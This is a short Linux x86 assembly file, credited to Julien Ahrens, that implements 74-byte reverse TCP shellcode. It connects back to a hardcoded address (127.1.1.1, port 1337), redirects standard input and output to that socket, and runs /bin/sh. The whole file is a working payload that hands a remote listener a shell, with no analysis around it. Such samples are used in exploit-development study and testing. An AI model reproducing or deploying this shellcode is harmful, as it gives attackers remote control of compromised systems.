; 
;  Title:    Shell Reverse TCP Shellcode - 74 bytes
;  Platform: Linux/x86
;  Date:     2014-07-25
;  Author:   Julien Ahrens (@MrTuxracer)
;  Website:  http://www.rcesecurity.com 
;


global _start


section .text

_start:
  push   0x66
  pop    eax
  push   0x1
  pop    ebx
  xor    edx,edx
  push   edx
  push   ebx
  push   0x2
  mov    ecx,esp
  int    0x80
  xchg   edx,eax
  mov    al,0x66
  push DWORD 0x101017f	;ip: 127.1.1.1
  push WORD 0x3905		;port: 1337
  inc    ebx
  push   bx
  mov    ecx,esp
  push   0x10
  push   ecx
  push   edx
  mov    ecx,esp
  inc    ebx
  int    0x80
  push   0x2
  pop    ecx
  xchg   edx,ebx

loop:
  mov    al,0x3f
  int    0x80
  dec    ecx
  jns short loop
  mov    al,0xb
  inc    ecx
  mov    edx,ecx
  push   edx
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
  int    0x80
